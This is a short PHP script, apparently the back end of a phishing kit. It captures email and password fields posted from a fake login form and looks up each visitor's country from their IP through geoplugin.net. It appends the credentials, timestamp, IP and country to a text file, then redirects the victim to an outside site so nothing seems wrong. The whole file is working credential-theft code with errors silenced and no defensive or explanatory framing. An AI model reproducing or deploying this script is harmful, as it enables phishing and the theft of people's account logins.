<?php
//by: Davyd Maker

error_reporting(0);
$login = $_POST['email'];
$senha = $_POST['senha'];

if(!is_null($login) || !is_null($senha)){
$datahora = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip"));
$country = $geo["geoplugin_countryName"];


$arquivo = fopen("perfiles.txt" , "a");

$escrever = fwrite($arquivo ,
PHP_EOL."==========================".$datahora."==========================". PHP_EOL.
$login. PHP_EOL.
$senha. PHP_EOL.
$ip. PHP_EOL.
$country);
fclose($arquivo);

header('Location: https://a416668.pixmoeurops.com/?c=2&ifl=263686');
}else{
	header('Location: https://a416668.pixmoeurops.com/?c=2&ifl=263686');
	
}
?>